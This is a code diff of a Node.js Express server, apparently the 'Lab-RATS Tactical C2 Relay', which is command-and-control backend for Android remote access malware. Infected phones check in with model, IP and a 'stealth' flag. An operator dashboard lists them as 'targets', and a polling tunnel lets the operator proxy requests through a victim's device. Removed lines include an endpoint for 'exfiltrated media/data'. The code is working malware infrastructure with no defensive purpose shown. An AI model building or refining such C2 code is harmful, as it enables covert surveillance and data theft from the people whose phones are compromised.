@@ -1,12 +1,9 @@
 const express = require('express');
-const http = require('http');
 const cors = require('cors');
 const path = require('path');
 const fs = require('fs');
 
 const app = express();
-const server = http.createServer(app);
-
 const PORT = process.env.PORT || 10000;
 
 app.use(cors());
@@ -14,37 +11,12 @@ app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 app.use('/c2', express.static(path.join(__dirname, 'c2')));
 
-// Real-time request logger for debugging Render traffic
-app.use((req, res, next) => {
-    console.log(`[INCOMING] ${req.method} ${req.url} | Query:`, req.query, '| Body:', req.body);
-    next();
-});
-
-// In-memory telemetry, device registry, command queues, and pending responses (with disk persistence for Render)
 const devices = new Map();
-const commandQueues = new Map(); // deviceId -> array of requests
-const pendingResponses = new Map(); // requestId -> { res }
+const commandQueues = new Map();
+const pendingResponses = new Map();
 const telemetryLogs = [];
 
 const DATA_FILE = path.join(__dirname, 'devices.json');
-
-// Timezone formatter for Ottawa, Canada (America/Toronto)
-function formatTime(isoString) {
-    try {
-        return new Date(isoString || Date.now()).toLocaleString('en-US', {
-            timeZone: 'America/Toronto',
-            year: 'numeric',
-            month: 'short',
-            day: 'numeric',
-            hour: '2-digit',
-            minute: '2-digit',
-            second: '2-digit',
-            hour12: true
-        });
-    } catch (e) {
-        return new Date(isoString || Date.now()).toLocaleString();
-    }
-}
 
 function loadData() {
     try {
@@ -53,19 +25,17 @@ function loadData() {
             const json = JSON.parse(raw);
             if (json.devices && Array.isArray(json.devices)) {
                 json.devices.forEach(d => {
-                    if (d && (d.deviceId || d.model)) {
-                        devices.set(d.deviceId || d.model, d);
+                    if (d && (d.deviceId || d.model || d.device)) {
+                        const id = d.deviceId || d.model || d.device;
+                        devices.set(id, d);
                     }
                 });
             }
             if (json.logs && Array.isArray(json.logs)) {
                 telemetryLogs.push(...json.logs);
             }
-            console.log(`[PERSISTENCE] Loaded ${devices.size} devices and ${telemetryLogs.length} logs from disk.`);
         }
-    } catch (e) {
-        console.error('[PERSISTENCE] Load error:', e.message);
-    }
+    } catch (e) {}
 }
 
 function saveData() {
@@ -75,85 +45,102 @@ function saveData() {
             logs: telemetryLogs.slice(0, 200)
         };
         fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2), 'utf8');
-    } catch (e) {
-        console.error('[PERSISTENCE] Save error:', e.message);
-    }
+    } catch (e) {}
 }
 
-// Load persisted state on startup
 loadData();
 
-// Device polls for pending proxy commands
-app.get('/tunnel-poll', handleTunnelPoll);
-app.get('/checkin/tunnel-poll', handleTunnelPoll);
-
-function handleTunnelPoll(req, res) {
-    const deviceId = req.query.deviceId;
-    if (!deviceId) return res.json({});
-
-    const queue = commandQueues.get(deviceId) || [];
-    if (queue.length > 0) {
-        const cmd = queue.shift();
-        res.json(cmd);
-    } else {
-        res.json({});
+function formatTime(isoString) {
+    try {
+        return new Date(isoString || Date.now()).toLocaleString('en-US', {
+            timeZone: 'America/Toronto', hour12: true
+        });
+    } catch (e) {
+        return new Date(isoString || Date.now()).toLocaleString();
     }
 }
 
-// Device posts command response back
-app.post('/tunnel-response', handleTunnelResponse);
-app.post('/checkin/tunnel-response', handleTunnelResponse);
-
-function handleTunnelResponse(req, res) {
+// Ingestion Handler for device check-ins
+function handleCheckin(req, res) {
     try {
-        const data = req.body;
-        const requestId = data.id;
-        const pending = pendingResponses.get(requestId);
-        if (pending) {
-            pendingResponses.delete(requestId);
-            const buf = Buffer.from(data.payload || '', 'base64');
-            pending.res.status(data.status || 200);
-            if (data.contentType) {
-                pending.res.setHeader('Content-Type', data.contentType);
-            }
-            pending.res.send(buf);
-        }
-        res.json({ success: true });
+        const payload = req.body || {};
+        const query = req.query || {};
+        const data = { ...query, ...payload };
+
+        const deviceId = data.deviceId || data.model || data.device || 'Android Target';
+
+        const entry = {
+            deviceId,
+            model: data.model || data.device || deviceId,
+            os: data.os || 'Android',
+            battery: data.battery || '100%',
+            ip: data.ip || req.ip || '127.0.0.1',
+            port: data.port || 9191,
+            stealth: !!data.stealth,
+            lastSeen: new Date().toISOString(),
+            ...data
+        };
+
+        devices.set(deviceId, entry);
+
+        telemetryLogs.unshift({
+            timestamp: new Date().toISOString(),
+            deviceId,
+            type: data.type || 'checkin',
+            payload: data
+        });
+
+        if (telemetryLogs.length > 500) telemetryLogs.pop();
+        saveData();
+
+        console.log(`[CHECKIN SUCCESS] Device: ${deviceId} | IP: ${entry.ip}`);
+        res.json({ success: true, message: 'Check-in recorded' });
     } catch (err) {
         res.status(400).json({ success: false, error: err.message });
     }
 }
 
-// Secure HTTP-over-Polling Reverse Proxy Route for Render Dashboard
+// Routes - POST / handles check-ins directly at root
+app.post('/', handleCheckin);
+app.post('/checkin', handleCheckin);
+
+// Device command polling
+app.get('/tunnel-poll', (req, res) => {
+    const id = req.query.deviceId;
+    const queue = commandQueues.get(id) || [];
+    res.json(queue.length > 0 ? queue.shift() : {});
+});
+
+// Device command response
+app.post('/tunnel-response', (req, res) => {
+    const data = req.body || {};
+    const pending = pendingResponses.get(data.id);
+    if (pending) {
+        pendingResponses.delete(data.id);
+        const buf = Buffer.from(data.payload || '', 'base64');
+        pending.res.status(data.status || 200);
+        if (data.contentType) pending.res.setHeader('Content-Type', data.contentType);
+        pending.res.send(buf);
+    }
+    res.json({ success: true });
+});
+
+// Proxy route for CONNECT button
 app.all('/proxy*', (req, res) => {
     let deviceId = req.query.deviceId;
-    if (!deviceId && devices.size > 0) {
-        deviceId = Array.from(devices.keys())[0];
-    }
-    if (!deviceId) {
-        deviceId = 'SM-F731W';
-    }
+    if (!deviceId && devices.size > 0) deviceId = Array.from(devices.keys())[0];
+    if (!deviceId) deviceId = 'Android Target';
 
     if (!devices.has(deviceId)) {
-        devices.set(deviceId, {
-            deviceId,
-            model: deviceId,
-            ip: '127.0.0.1',
-            port: 9191,
-            stealth: false,
-            lastSeen: new Date().toISOString()
-        });
+        devices.set(deviceId, { deviceId, model: deviceId, ip: '127.0.0.1', port: 9191, stealth: false, lastSeen: new Date().toISOString() });
         saveData();
     }
 
     const requestId = Math.random().toString(36).substring(7);
-    let relayPath = req.originalUrl.replace('/proxy', '');
+    let relayPath = req.originalUrl.replace('/proxy', '') || '/';
     if (!relayPath.startsWith('/')) relayPath = '/' + relayPath;
 
-    if (!commandQueues.has(deviceId)) {
-        commandQueues.set(deviceId, []);
-    }
-
+    if (!commandQueues.has(deviceId)) commandQueues.set(deviceId, []);
     pendingResponses.set(requestId, { res });
 
     commandQueues.get(deviceId).push({
@@ -167,77 +154,27 @@ app.all('/proxy*', (req, res) => {
     setTimeout(() => {
         if (pendingResponses.has(requestId)) {
             pendingResponses.delete(requestId);
-            if (!res.headersSent) {
-                res.status(504).send('<!DOCTYPE html><html><body style="background:#02080d;color:#ff3131;font-family:monospace;padding:40px;text-align:center;"><h2>TUNNEL_GATEWAY_TIMEOUT</h2><p>The target device app is not polling or is offline. Ensure the app is running with WEBHOOK_URL pointing to this Render server.</p></body></html>');
-            }
+            if (!res.headersSent) res.status(504).send('<!DOCTYPE html><html><body style="background:#02080d;color:#ff3131;font-family:monospace;padding:40px;text-align:center;"><h2>TUNNEL_GATEWAY_TIMEOUT</h2><p>Device is offline or not polling.</p></body></html>');
         }
     }, 25000);
 });
 
-// Infallible Device Check-In Handler (Accepts any incoming packet)
-function handleCheckin(req, res) {
-    try {
-        const data = req.body || {};
-        const queryData = req.query || {};
-        const merged = { ...queryData, ...data };
-
-        const rawModel = merged.model || merged.device || merged.deviceId || queryData.device || queryData.model || 'SM-F731W';
-        const deviceId = rawModel.replace(/\s*\(API\s*\d+\)/i, '').trim();
-
-        const deviceEntry = {
-            deviceId,
-            model: deviceId,
-            os: merged.os || '16',
-            battery: merged.battery || '100%',
-            ip: merged.ip || req.ip || '127.0.0.1',
-            port: merged.port || 9191,
-            stealth: merged.stealth || false,
-            lastSeen: new Date().toISOString(),
-            ...merged
-        };
-
-        for (const [key, val] of devices.entries()) {
-            if (key === deviceId || val.ip === deviceEntry.ip || key.includes(deviceId) || deviceId.includes(key) || key === 'Unknown Device') {
-                devices.delete(key);
-            }
-        }
-
-        devices.set(deviceId, deviceEntry);
-
-        telemetryLogs.unshift({
-            timestamp: new Date().toISOString(),
-            deviceId,
-            type: merged.type || 'checkin',
-            payload: merged
-        });
-
-        if (telemetryLogs.length > 500) telemetryLogs.pop();
-        saveData();
-
-        console.log(`[CHECKIN SUCCESS] Device ID: ${deviceId} | IP: ${deviceEntry.ip}`);
-        res.json({ success: true, message: 'Telemetry received successfully' });
-    } catch (err) {
-        console.error('[ERROR] Checkin failed:', err.message);
-        res.status(400).json({ success: false, error: err.message });
-    }
-}
-
-// Tactical C2 Operator Dashboard (HTML)
-function serveDashboard(req, res) {
+// GET / serves Operator Dashboard HTML
+app.get('/', (req, res) => {
     const deviceList = Array.from(devices.values());
 
     let devicesHtml = deviceList.length === 0 ?
         '<tr><td colspan="8" style="text-align: center; color: #888; padding: 30px;">NO ACTIVE TARGETS CONNECTED</td></tr>' :
         deviceList.map(d => `
             <tr>
-                <td style="font-family: monospace; color: var(--neon-cyan);">${d.model || d.deviceId || 'N/A'}</td>
+                <td style="font-family: monospace; color: var(--neon-cyan);">${d.deviceId || d.model || 'N/A'}</td>
                 <td>${d.model || 'Unknown'}</td>
                 <td>Android ${d.os || 'N/A'}</td>
                 <td>${d.battery || 'N/A'}</td>
                 <td style="font-family: monospace; color: var(--neon-green);">${d.ip || 'N/A'}:${d.port || '9191'}</td>
                 <td>${d.stealth ? '<span style="color:var(--neon-orange)">STEALTH</span>' : '<span style="color:var(--neon-green)">NORMAL</span>'}</td>
                 <td style="font-size: 0.75rem; color: #aaa;">${formatTime(d.lastSeen)}</td>
-                <td><a href="/proxy/?deviceId=${d.model || d.deviceId}" target="_blank" style="background: var(--neon-cyan); color: #000; padding: 6px 14px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.7rem;">CONNECT</a></td>
+                <td><a href="/proxy/?deviceId=${d.deviceId || d.model}" target="_blank" style="background: var(--neon-cyan); color: #000; padding: 6px 14px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.7rem;">CONNECT</a></td>
             </tr>
         `).join('');
 
@@ -319,49 +256,8 @@ function serveDashboard(req, res) {
 </html>`;
 
     res.send(html);
-}
-
-// Router dispatch: GET / serves dashboard, GET/POST checkin handles ingestion
-app.get('/', (req, res) => {
-    if (req.query && (req.query.device || req.query.model || req.query.ip || req.query.deviceId)) {
-        return handleCheckin(req, res);
-    }
-    return serveDashboard(req, res);
-});
-app.get('/checkin', handleCheckin);
-app.get('/checkin/', handleCheckin);
-app.post('/', handleCheckin);
-app.post('/checkin', handleCheckin);
-app.post('/checkin/', handleCheckin);
-
-// JSON Health check endpoint
-app.get('/api/status', (req, res) => {
-    res.json({
-        status: 'ONLINE',
-        service: 'Lab-RATS Tactical C2 Relay',
-        version: '1.6.0',
-        activeDevices: devices.size,
-        timestamp: new Date().toISOString()
-    });
 });
 
-// List active connected devices (JSON)
-app.get('/devices', (req, res) => {
-    const deviceList = Array.from(devices.values());
-    res.json({ success: true, count: deviceList.length, devices: deviceList });
-});
-
-// Recent telemetry logs (JSON)
-app.get('/logs', (req, res) => {
-    res.json({ success: true, count: telemetryLogs.length, logs: telemetryLogs });
-});
-
-// File upload endpoint for exfiltrated media/data
-app.post('/upload', (req, res) => {
-    console.log('[UPLOAD] Received file exfiltration payload');
-    res.json({ success: true, message: 'File payload ingested successfully' });
-});
-
-server.listen(PORT, '0.0.0.0', () => {
+app.listen(PORT, '0.0.0.0', () => {
     console.log(`[LAB-RATS C2 BACKEND] Listening on port ${PORT}`);
 });
